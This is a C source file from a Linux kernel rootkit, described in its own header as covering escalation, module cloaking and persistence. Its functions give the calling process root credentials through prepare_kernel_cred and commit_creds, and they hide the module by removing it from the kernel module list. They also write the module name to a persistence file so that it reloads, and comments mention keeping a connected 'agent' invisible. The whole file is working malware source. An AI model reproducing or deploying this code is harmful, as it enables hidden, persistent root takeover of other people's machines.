// SPDX-License-Identifier: GPL-2.0
// core/opsec.c - Escalation, module cloaking, persistence.
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <net/inet_sock.h>
#include "rootkit.h"

// Privilege escalation
int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

// Module cloaking
static struct list_head *saved_mod_list;

void rk_cloak(void)
{
	if (saved_mod_list)
		return;
	saved_mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void rk_uncloak(void)
{
	if (!saved_mod_list)
		return;
	list_add(&THIS_MODULE->list, saved_mod_list);
	saved_mod_list = NULL;
}

// Persistence
int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
	return 0;
}

int rk_unpersist(void)
{
	struct file *f;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);
	filp_close(f, NULL);
	return 0;
}

// Auto-hide: make the agent invisible while connected.
// Auto-unhide: clean up on disconnect.
